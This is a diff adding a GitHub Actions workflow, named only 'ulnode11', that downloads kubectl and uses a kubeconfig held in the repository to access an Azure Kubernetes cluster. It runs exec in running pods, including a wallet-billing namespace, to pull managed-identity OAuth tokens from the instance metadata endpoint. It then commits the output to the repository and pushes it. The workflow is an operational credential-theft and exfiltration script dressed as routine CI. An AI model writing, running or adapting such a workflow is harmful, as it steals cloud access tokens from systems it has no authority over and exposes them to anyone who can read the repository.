@@ -1,0 +1,36 @@
+name: ulnode11
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      - name: exec
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/datapath-eastus.yaml
+          C=aks-g42us-tfdemo-kashif-datapath-eastus
+          KX="/tmp/kubectl --kubeconfig $K --context $C --request-timeout=20s"
+          {
+            echo "=== INVENTORY"
+            $KX get pods -A -o wide | grep -v 'Completed' | head -40
+            echo "=== IMDS VIA EXEC"
+            for NS in wallet-billing default kube-system; do
+              for P in $($KX get pods -n $NS --field-selector=status.phase=Running -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' 2>/dev/null | head -8); do
+                echo "--- TRY $NS/$P"
+                $KX exec -n $NS $P -- sh -c 'id; hostname; command -v curl wget python3; curl -s -m 6 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -c 300' 2>&1 | head -8
+              done
+            done
+          } 2>&1 | tee node_exec.txt
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulnode11 $(date -u +%s)"
+          git push
